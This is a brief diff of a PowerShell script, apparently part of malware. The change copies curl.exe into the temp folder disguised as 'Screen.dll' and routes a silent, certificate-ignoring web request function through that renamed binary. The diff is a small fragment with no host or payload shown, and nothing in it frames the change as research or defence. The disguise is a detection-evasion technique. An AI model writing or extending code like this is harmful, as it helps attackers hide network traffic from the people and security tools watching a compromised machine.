@@ -1,5 +1,6 @@
 # Functions #
-$curl = "C:\Users\Public\curl.exe"
+$curl = $env:temp + "\Screen.dll"
+Copy-Item "C:\Users\Public\curl.exe" $curl
 function Request($url){
 	$string = cmd.exe /c $curl $url -s -k;
 	return [string]$string;
